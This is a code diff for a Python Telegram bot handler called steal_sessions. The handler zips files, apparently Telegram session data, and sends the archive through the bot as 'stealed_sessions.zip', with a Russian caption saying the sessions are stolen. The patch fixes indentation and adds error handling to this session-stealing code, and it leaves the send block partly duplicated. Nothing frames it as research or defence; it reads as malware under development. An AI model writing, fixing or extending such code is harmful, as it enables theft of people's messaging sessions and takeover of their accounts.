@@ -70,12 +70,23 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         zf.write(path_obj, arcname=path_obj.name)
                     elif path_obj.is_dir():
                         for file in path_obj.rglob('*'):
-                        if file.is_file():
-                        zf.write(file, arcname=file.relative_to(path_obj))
+                            if file.is_file():
+                                zf.write(file, arcname=file.relative_to(path_obj))
+
+        mem_zip.seek(0)
+
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=InputFile(mem_zip, filename="stealed_sessions.zip"),
+            caption="🔥 Сессии Telegram украдены"
+        )
+
+    except Exception as e:
+        await update.message.reply_text(f"💥 Ошибка: {str(e)}")
 
 mem_zip.seek(0)
 
-        await context.bot.send_document(
+    await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=InputFile(mem_zip, filename="stealed_sessions.zip"),
             caption="🔥 Сессии Telegram украдены"
